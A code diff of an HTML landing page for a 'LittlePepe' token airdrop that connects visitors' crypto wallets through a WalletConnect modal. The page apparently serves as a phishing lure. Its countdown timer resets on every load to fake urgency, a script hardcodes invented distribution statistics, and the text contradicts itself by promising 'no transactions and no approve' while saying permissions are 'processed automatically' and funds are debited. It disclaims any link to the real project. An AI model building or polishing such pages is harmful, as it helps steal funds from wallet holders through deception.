@@ -1,24 +1,22 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AirDrop — LittlePepe</title>
-<link rel="stylesheet" href="style.css">
-<link rel="icon" href="logo.svg" type="image/svg+xml">
-<meta name="description" content="Little Pepe airdrop: connecting a wallet (MetaMask/Trust/OKX), без транзакций и без approve.">
-
-<!-- Подключаем AppKit напрямую через unpkg -->
-<script type="module">
-import * as AppKitModule from "https://cdn.jsdelivr.net/npm/@reown/appkit@1.7.20/dist/index.js";
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+  <title>AirDrop — Littlepepe</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="logo.svg" type="image/svg+xml">
+  <meta name="description" content=Little Pepe airdrop: connecting a wallet (MetaMask/Trust/OKX), без транзакций и без approve."/>
+	  <script type="module">
+  import { createWeb3Modal, defaultWagmiConfig } from "https://esm.sh/@web3modal/wagmi";
 import { polygon } from "https://esm.sh/viem/chains";
 
 const projectId = "56edaed968d799280ffd685113d7f126";
 const chains = [polygon];
+const config = defaultWagmiConfig({ chains, projectId });
 
-// Инициализация AppKit
-const appkit = new AppKitModule.AppKit({
-  wagmiConfig: AppKitModule.defaultWagmiConfig({ chains, projectId }),
+const modal = createWeb3Modal({
+  wagmiConfig: config,
   projectId,
   chains,
   themeMode: "dark",
@@ -30,139 +28,213 @@ const appkit = new AppKitModule.AppKit({
 
 window.onload = () => {
   const claimBtn = document.getElementById("claimBtn");
-  const copyBtn = document.getElementById("copyBtn");
-  const addrBox = document.getElementById("addrBox");
-  const networkBox = document.getElementById("networkBox");
-
-  claimBtn.disabled = false;
-
+  
+  claimBtn.disabled = false; // делаем кнопку активной сразу
   claimBtn.addEventListener("click", async () => {
-    try {
-      const wallet = await appkit.connectWallet(); // открываем меню кошельков
-      const address = wallet.address;
-      const network = wallet.chain.name || wallet.chain.id;
-
-      addrBox.innerText = address;
-      networkBox.innerText = "Network: " + network;
-
-      copyBtn.disabled = false;
-    } catch (e) {
-      console.error("Ошибка подключения кошелька:", e);
-    }
+    // открываем меню выбора кошелька
+    await modal.open();
   });
+};
 
-  copyBtn.addEventListener("click", () => {
-    const address = addrBox.innerText;
-    if (address && address !== "Wallet not connected") {
-      navigator.clipboard.writeText(address);
-      alert("Address copied!");
-    }
-  });
+  </script>
+</head>
+<body>
+  <header class="nav">
+    <div class="brand">
+      <img src="logo.svg" alt="logo" class="logo"/>
+      <div class="brand-text">
+        <div class="title">AIR<span>DROP</span></div>
+        <div class="subtitle">Live • Product</div>
+      </div>
+    </div>
 
-  // Таймер AirDrop
-  const countdownEl = document.getElementById("countdown");
-  let endTime = new Date();
-  endTime.setHours(endTime.getHours() + 23);
-  endTime.setMinutes(endTime.getMinutes() + 42);
-  endTime.setSeconds(endTime.getSeconds() + 56);
+    <div class="wallet-box">
+      
+      <button id="disconnectBtn" class="btn ghost hidden">Disable</button>
+    </div>
+  </header>
 
-  function updateCountdown() {
+  <main class="container">
+    <section class="hero card">
+      <h1 id="tokenName">Airdrop: <span>LittlePepe</span> Token</h1>
+      <p class="lead">
+        Welcome to AirDrop!
+Connect your wallet (MetaMask, TrustWallet, etc.) and participate in the token distribution. All operations are in real mode — you can send and receive tokens.
+      </p>
+
+      <div class="stats">
+        <div class="stat">
+          <div class="stat-num" id="supply">1,000,000</div>
+          <div class="stat-label">Total tokens</div>
+        </div>
+        <div class="stat">
+          <div class="stat-num" id="claimable">2,000</div>
+          <div class="stat-label">on one member</div>
+        </div>
+        <div class="stat">
+
+
+          <div id="countdown">Loading...</div>
+
+<script>
+
+let endTime = new Date();
+endTime.setHours(endTime.getHours() + 23);
+endTime.setMinutes(endTime.getMinutes() + 42);
+endTime.setSeconds(endTime.getSeconds() + 56);
+
+function updateCountdown() {
     let now = new Date();
     let diff = endTime - now;
 
     if (diff <= 0) {
-      countdownEl.innerText = "AirDrop ended!";
-      clearInterval(timer);
-      return;
+        document.getElementById("countdown").innerHTML = "AirDrop ended!";
+        clearInterval(timer);
+        return;
     }
 
     let hours = Math.floor(diff / (1000 * 60 * 60));
     let minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
     let seconds = Math.floor((diff % (1000 * 60)) / 1000);
 
-    countdownEl.innerText = `${hours}h ${minutes}m ${seconds}s`;
-  }
+    document.getElementById("countdown").innerHTML =
+        hours + "h " + minutes + "m " + seconds + "s";
+}
 
-  let timer = setInterval(updateCountdown, 1000);
-  updateCountdown();
-};
+
+let timer = setInterval(updateCountdown, 1000);
+updateCountdown();
 </script>
-</head>
-<body>
-<header class="nav">
-  <div class="brand">
-    <img src="logo.svg" alt="logo" class="logo"/>
-    <div class="brand-text">
-      <div class="title">AIR<span>DROP</span></div>
-      <div class="subtitle">Live • Product</div>
-    </div>
+          
+          <div class="stat-label">Until the end</div>
+        </div>
+      </div>
+
+      <div class="card inner">
+        <div class="wallet-info">
+          <div id="addrBox" class="muted">Wallet not connected
+</div>
+          <div id="networkBox" class="muted">Network: —</div>
+        </div>
+
+        <div class="actions">
+          <button id="claimBtn" class="btn success" disabled>Claim</button>
+          <button id="copyBtn" class="btn" disabled>Copy address</button>
+        </div>
+
+        <div id="notice" class="notice">
+       <p>
+       ⚠️ AirDrop is active: the Claim button creates a signature and makes a real transaction to your wallet. Funds are debited only after your confirmation, and all necessary permissions are processed automatically.
+       </p>
+        </div>
+      </div>
+    </section>
+    
+<div class="airdrop-tab">
+  <h3>Why Choose Our AirDrop?</h3>
+  <p>
+    Our AirDrop is designed to reward our community fairly, safely, and transparently.
+    Join now to receive tokens directly to your wallet, with full control over your participation.
+  </p>
+</div>
+
+
+<div class="airdrop-stats">
+  <div class="stat-tab">
+    <div class="stat-number" id="total-distributed">0</div>
+    <div class="stat-label">Total Distributed</div>
   </div>
-</header>
-
-<main class="container">
-  <section class="hero card">
-    <h1 id="tokenName">Airdrop: <span>LittlePepe</span> Token</h1>
-    <p class="lead">
-      Connect your wallet (MetaMask, TrustWallet, Ledger, etc.) and participate in the token distribution.
-    </p>
-
-    <div class="stats">
-      <div class="stat">
-        <div class="stat-num" id="supply">1,000,000</div>
-        <div class="stat-label">Total tokens</div>
-      </div>
-      <div class="stat">
-        <div class="stat-num" id="claimable">2,000</div>
-        <div class="stat-label">on one member</div>
-      </div>
-      <div class="stat">
-        <div id="countdown">Loading...</div>
-        <div class="stat-label">Until the end</div>
-      </div>
-    </div>
-
-    <div class="card inner">
-      <div class="wallet-info">
-        <div id="addrBox" class="muted">Wallet not connected</div>
-        <div id="networkBox" class="muted">Network: —</div>
-      </div>
-
-      <div class="actions">
-        <button id="claimBtn" class="btn success" disabled>Claim</button>
-        <button id="copyBtn" class="btn" disabled>Copy address</button>
-      </div>
-
-      <div id="notice" class="notice">
-        <p>⚠️ AirDrop is active: the Claim button creates a signature and makes a real transaction to your wallet.</p>
-      </div>
-    </div>
-  </section>
-
-  <div class="airdrop-tab">
-    <h3>Why Choose Our AirDrop?</h3>
-    <p>
-      Our AirDrop is designed to reward our community fairly, safely, and transparently.
-    </p>
+  <div class="stat-tab">
+    <div class="stat-number" id="users-received">0</div>
+    <div class="stat-label">Users Participated</div>
   </div>
-
-  <div class="airdrop-stats">
-    <div class="stat-tab">
-      <div class="stat-number" id="total-distributed">742,000</div>
-      <div class="stat-label">Total Distributed</div>
-    </div>
-    <div class="stat-tab">
-      <div class="stat-number" id="users-received">371</div>
-      <div class="stat-label">Users Participated</div>
-    </div>
-    <div class="stat-tab">
-      <div class="stat-number" id="tokens-left">258,000</div>
-      <div class="stat-label">Tokens Left</div>
-    </div>
+  <div class="stat-tab">
+    <div class="stat-number" id="tokens-left">0</div>
+    <div class="stat-label">Tokens Left</div>
   </div>
-</main>
+</div>
 
-<footer class="footer">
-  <div>© 2025 Little Pepe Airdrop. Not affiliated with Little Pepe Foundation.</div>
-</footer>
+<style>
+.airdrop-tab {
+  background: #111;
+  color: #fff;
+  padding: 15px;
+  border-radius: 8px;
+  margin-bottom: 20px;
+  max-width: 1200px;
+}
+
+.airdrop-tab h3 {
+  margin: 0 0 10px 0;
+  font-size: 18px;
+}
+
+.airdrop-tab p {
+  font-size: 14px;
+  line-height: 1.4;
+}
+
+.airdrop-stats {
+  display: flex;
+  gap: 10px;
+  background: #000;
+  padding: 10px;
+  border-radius: 8px;
+  max-width: 1200px;
+}
+
+.stat-tab {
+  flex: 1;
+  background: #111;
+  border-radius: 6px;
+  padding: 10px;
+  text-align: center;
+  color: #00bfff; /* голубой цвет */
+}
+
+.stat-number {
+  font-size: 16px;
+  font-weight: bold;
+}
+
+.stat-label {
+  font-size: 12px;
+  margin-top: 4px;
+  color: #ccc;
+}
+</style>
+
+<script>
+// Пример динамических данных
+document.getElementById('total-distributed').innerText = '742,000';
+document.getElementById('users-received').innerText = '371';
+document.getElementById('tokens-left').innerText = '258,000';
+</script>
+
+  </main>
+  <br><br><br><br>
+  <footer class="footer">
+    <div>© 2025 Little Pepe Airdrop. Not affiliated with Little Pepe Foundation.</div>
+  </footer>
+
+ 
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+	<script type="module">
+  import AppKit from './node_modules/@reown/appkit/dist/index.js';
+
+  // Инициализация AppKit
+  const app = new AppKit({
+    projectId: 'твой_projectId',  // вставь свой projectId
+    networks: ['polygon'],        // сети, которые поддерживаешь
+    wallets: ['metamask', 'trust', 'ledger'] // только кошельки
+  });
+
+  // app теперь готов к использованию в коде
+  console.log('AppKit подключен', app);
+</script>
+
+
+	
+  <script src="app.js" defer></script>
 </body>
 </html>
